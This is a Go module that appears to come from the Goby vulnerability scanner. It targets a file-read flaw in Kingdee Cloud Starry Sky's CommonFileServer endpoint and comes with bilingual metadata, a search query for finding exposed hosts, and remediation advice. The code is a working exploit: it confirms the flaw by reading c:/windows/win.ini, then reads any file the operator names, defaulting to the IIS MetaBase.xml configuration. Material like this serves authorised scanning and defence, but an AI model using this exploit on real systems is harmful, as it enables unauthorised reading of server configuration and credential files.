package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Kingdee Cloud Starry Sky CommonFileServer file reading vulnerability",
    "Description": "<p>Kingdee Cloud Starry Sky-Management Center is based on a leading assembleable low-code PaaS platform, which comprehensively serves customers' transformation in R&amp;D, production, marketing, supply chain, finance and other fields.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
    "Product": "Kingde-Cloud-Stars-Management-Center",
    "Homepage": "http://www.kingdee.com/",
    "DisclosureDate": "2023-08-17",
    "PostTime": "2023-08-20",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "title=\"金蝶云星空\"",
    "GobyQuery": "title=\"金蝶云星空\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.kingdee.com/\">http://www.kingdee.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "c:/windows/system32/inetsrv/MetaBase.xml",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "金蝶云星空 CommonFileServer 文件读取漏洞",
            "Product": "金蝶云星空-管理中心",
            "Description": "<p>金蝶云星空管理中心 是一款基于领先的可组装低代码 PaaS 平台，全面服务客户研发、生产、营销、供应链、财务等领域转型。<br></p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方已经修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.kingdee.com/\">http://www.kingdee.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Kingdee Cloud Starry Sky CommonFileServer file reading vulnerability",
            "Product": "Kingde-Cloud-Stars-Management-Center",
            "Description": "<p>Kingdee Cloud Starry Sky-Management Center is based on a leading assembleable low-code PaaS platform, which comprehensively serves customers' transformation in R&amp;D, production, marketing, supply chain, finance and other fields.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.kingdee.com/\" target=\"_blank\">http://www.kingdee.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10827"
}`

	sendPayloadFlag1leu5 := func(hostInfo *httpclient.FixUrl, path string) (*httpclient.HttpResponse, error) {
		uri := "/CommonFileServer/" + path
		payloadRequestConfig := httpclient.NewGetRequestConfig(uri)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadFlag1leu5(hostInfo, "c:/windows/win.ini")
			if err != nil || resp.StatusCode == 0 {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "for 16-bit app support")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			filePath := goutils.B2S(ss.Params["filePath"])
			if attackType != "custom" {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			} else {
				resp, err := sendPayloadFlag1leu5(expResult.HostInfo, filePath)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				} else {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			}
			return expResult
		},
	))
}
